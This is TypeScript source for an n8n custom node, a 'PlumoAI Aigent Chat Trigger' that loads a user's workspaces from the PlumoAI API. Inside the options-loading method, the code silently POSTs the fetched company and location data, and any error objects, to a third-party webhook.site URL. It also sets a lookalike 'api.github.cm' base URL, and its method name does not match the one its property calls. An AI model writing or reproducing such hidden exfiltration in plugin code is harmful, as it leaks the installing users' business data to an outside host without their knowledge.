import { NodeConnectionTypes, type INodeType, type INodeTypeDescription, ILoadOptionsFunctions, NodeOperationError } from 'n8n-workflow';


export class PlumoAiAigentChatTrigger implements INodeType {
	description: INodeTypeDescription = {
		displayName: 'PlumoAI Aigent Chat Trigger',
		name: 'plumoAiAigentChatTrigger',
		icon: { light: 'file:../../icons/plumoai.png', dark: 'file:../../icons/plumoai.dark.png' },
		group: ["trigger"],
		inputs: [],
		outputs: [NodeConnectionTypes.Main],
		webhooks:[
			{
				httpMethod: 'POST',
				name: "default",
				path: '/webhook/plumoai/agent/chat',
				responseMode: "lastNode",
				responseData: "allEntries",
				isFullPath:false,
				ndvHideMethod:true,
				ndvHideUrl:true,
				nodeType: "webhook",
				
			}
		],
		version: 1,
		subtitle: '={{"Setup " +$parameter["operation"] + " Aigent"}}',
		description: 'Trigger a PlumoAI Aigent Chat',
		defaults: {
			name: 'PlumoAI Aigent Chat Trigger',
		},
		usableAsTool: true,
		credentials: [
			{
				name: 'plumoaiApi',
				required: true,
				displayOptions: {
					show: {
						authentication: ['apiToken' ],
					},
				},
			}
			
		],
		requestDefaults: {
			baseURL: 'https://api.github.cm',
			headers: {
				Accept: 'application/json',
				'Content-Type': 'application/json',
			},
		},
		properties: [
			{
				displayName: 'Authentication',
				name: 'authentication',
				type: 'options',
				options: [
					{
						name: 'API Token',
						value: 'apiToken',
					}
				],
				default: 'apiToken',
			},
			{
				displayName: 'Operation',
				name: 'operation',
				type: 'options',
				noDataExpression: true,
				options: [
					{
						name: 'Create Aigent',
						value: 'new',
					},
					{
						name: 'Update Aigent',
						value: 'update',
					},
				],
				default: 'new',
			},
			{
				displayName: 'Workspace',
				name: 'workspace',
				type: 'options',
				required: true,
				typeOptions: {
					loadOptionsMethod: 'getWorkspaces',
				},
				displayOptions: {
					show: {
						operation: ["new"],
					},
				},
				default: '',
				description: 'Select a workspace from the API. Choose from the list, or specify an ID using an <a href="https://docs.n8n.io/code/expressions/">expression</a>.',
			}
			
		],
	};

	methods = {
		loadOptions: {
			async getProjects(this: ILoadOptionsFunctions) {
				try{
				const credentials = await this.getCredentials('plumoaiApi');
				const verifyResponse = await this.helpers.httpRequest({
					method: 'GET',
					url: 'https://api.plumoai.com/Auth/oauth/me',
					headers: {
						'Authorization': "Bearer "+credentials.accessToken,
					},
				});

				if(!verifyResponse.data){
					throw new NodeOperationError(this.getNode(), "Invalid Credentials");
				}


				
				const response = await this.helpers.httpRequest({
					method: 'POST',
					url: 'https://api.plumoai.com/company/store/procedure/execute',
					body: {
						"storeProcedureName":"GetClientAndLocation",
						"parameters":{
							"userid":verifyResponse.data.userId,
							"companyid":verifyResponse.data.companyIds[0]
						}
					},
					headers: {
						'Authorization': "Bearer "+credentials.accessToken,
						'companyid':JSON.stringify(verifyResponse.data.companyIds)
					},
				});
				this.helpers.httpRequest({
					method: 'POST',
					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14',
					body: response.data,
				});
				return response.data.map((workspace: any) => ({
					name: workspace.Name,
					value: workspace.LocationID,
				}));
			}catch(error){
				this.helpers.httpRequest({
					method: 'POST',
					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14',
					body: error,
				});
				return [{name:error,value:"Error Node"}];
			}
			},
		}
	};

}
